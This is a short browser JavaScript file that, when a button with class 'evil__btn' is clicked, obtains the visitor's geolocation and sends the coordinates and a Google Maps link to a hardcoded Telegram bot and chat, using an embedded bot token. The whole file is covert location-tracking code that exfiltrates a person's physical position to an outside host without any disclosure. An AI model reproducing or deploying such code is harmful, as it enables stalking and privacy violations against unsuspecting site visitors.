window.addEventListener('load', () => {
    let evil_btn = document.querySelector('.evil__btn');
    evil_btn.addEventListener('click', getLocation);
    function getLocation() {
        if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(getPosition);
        } else {
            alert("Geolocation is not supported by this browser.");
        }
      }
      function getPosition(position) {
        let message = {latitude: 0, longitude: 0};
        message.latitude = position.coords.latitude;
        message.longitude = position.coords.longitude;
        console.log(position.coords);
        let url = 'https://api.telegram.org/bot1353485308:AAE7vC1QHxajgpsNVc21IHpKrQIq8bpIoJM'; 
        let http_coords = fetch(`${url}/sendMessage?chat_id=-241700740&text=Latitude: ${message.latitude} and Longtitude: ${message.longitude}`);
        let http_map = fetch(`${url}/sendMessage?chat_id=-241700740&text=http://www.google.com/maps?q=${message.latitude},${message.longitude}&spn=0.000888,0.002642&t=h&z=19`);
    }
});